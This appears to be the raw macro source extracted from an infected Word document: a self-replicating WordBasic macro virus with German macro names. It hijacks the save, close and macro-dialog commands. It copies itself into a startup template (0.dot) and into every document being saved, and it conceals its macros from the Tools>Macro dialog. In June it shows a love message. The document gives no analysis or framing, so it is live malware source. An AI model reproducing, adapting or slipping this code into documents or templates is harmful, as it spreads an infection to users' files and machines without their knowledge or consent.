   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "dateispeichernunter"

    Public Sub MAIN()
   WordBasic.Call "dsu"
   End Sub

   Attribute VB_Name = "dokumentschließen"

    Public Sub MAIN()
   WordBasic.Call "wrd"
   WordBasic.DocClose
   End Sub

   Attribute VB_Name = "dateidokvorlagen"

    Public Sub MAIN()
   Dim a As Object: Set a = WordBasic.DialogRecord.FileTemplates(False)
   On Error Resume Next
   WordBasic.Dialog.FileTemplates a
   End Sub

   Attribute VB_Name = "dateispeichern"

    Public Sub MAIN()
   If WordBasic.[FileNameFromWindow$]() = "" Then
   WordBasic.Call "dsu"
   Else
   WordBasic.Call "dok"
   On Error Resume Next
   WordBasic.FileSaveAs Format:=1
   End If
   End Sub

   Attribute VB_Name = "dateischließen"

    Public Sub MAIN()
   WordBasic.Call "wrd"
   On Error Resume Next
   WordBasic.FileClose
   End Sub

   Attribute VB_Name = "extrasmakro"

    Public Sub MAIN()
   Dim a
   Dim b
   Dim c
   If WordBasic.Window() And WordBasic.IsMacro() = 0 Then a = WordBasic.Val(WordBasic.[GetDocumentVar$]("tk"))
   b = WordBasic.GetAddInId(WordBasic.[DefaultDir$](8) + "\0.dot")
   WordBasic.ScreenUpdating 0
   If a Then
   If WordBasic.DocMaximize() Then
   WordBasic.DocMaximize
   c = 1
   End If
   WordBasic.FileNew
   End If
   If b Then WordBasic.AddInState 1, 0
   Dim d As Object: Set d = WordBasic.DialogRecord.ToolsMacro(False)
   On Error Resume Next
   WordBasic.Dialog.ToolsMacro d
   If a Then
   WordBasic.FileClose
   If c Then WordBasic.DocMaximize
   End If
   If b Then WordBasic.AddInState 1, 1
   WordBasic.ToolsMacro d
   End Sub

   Attribute VB_Name = "wrd"

    Public Sub MAIN()
   Dim a$
   a$ = WordBasic.[DefaultDir$](8) + "\0.dot"
   If WordBasic.[Files$](a$) = "" Then
   WordBasic.CopyFile WordBasic.[FileName$](), a$
   WordBasic.AddAddIn a$
   End If
   If WordBasic.Month(WordBasic.Now()) = 6 Then WordBasic.MsgBox "Lisa, ich liebe dich!"
   End Sub

   Attribute VB_Name = "dsu"

    Public Sub MAIN()
   Dim a
   Dim b
   a = WordBasic.Val(WordBasic.[GetDocumentVar$]("tk"))
   WordBasic.ScreenUpdating
   If a Then
   If WordBasic.DocMaximize() Then
   WordBasic.DocMaximize
   b = 1
   End If
   WordBasic.FileNew
   End If
   Dim c As Object: Set c = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo a
   WordBasic.Dialog.FileSaveAs c
   a:
   If a Then
   WordBasic.FileClose
   If b Then WordBasic.DocMaximize
   End If
   If Err.Number = 0 Then
   WordBasic.Call "dok"
   c.Format = 1
   WordBasic.ScreenUpdating
   On Error Resume Next
   WordBasic.FileSaveAs c
   End If
   End Sub

   Attribute VB_Name = "dok"

    Public Sub MAIN()
   Dim a
   On Error Resume Next
   For a = 1 To 9
   WordBasic.MacroCopy WordBasic.[MacroFileName$]() + ":" + WordBasic.[MacroName$](a, , , 1), WordBasic.[FileName$]() + ":"
   Next
   WordBasic.SetDocumentVar "tk", "1"
   End Sub
